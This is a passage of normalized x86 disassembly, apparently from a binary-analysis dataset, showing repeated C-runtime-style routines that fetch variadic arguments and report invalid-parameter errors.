push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a1d9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a257
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a357
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a423
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a4ef
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a5bb
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a66d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a6eb
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a769
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a7e7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a8cd
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427956
jmp r-xdata
sub_41a95b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4279a1
jmp r-xdata
sub_41a9e9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4279ec
jmp r-xdata
sub_41aa77
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427a39
jmp r-xdata
sub_41ab05
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41ab25
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41ab45
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41ab65
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41ab85
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427956
jmp r-xdata
sub_41ac13
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4279a1
jmp r-xdata
sub_41aca1
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4279ec
jmp r-xdata
sub_41ad2f
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427a39
jmp r-xdata
sub_41adbd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41addd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41adfd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ae1d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ae3d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427956
jmp r-xdata
sub_41aecb
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4279a1
jmp r-xdata
sub_41af59
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4279ec
jmp r-xdata
sub_41afe7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427a39
jmp r-xdata
sub_41b075
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b095
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b0b5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b0d5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b0f5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b177
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b1f9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b27b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
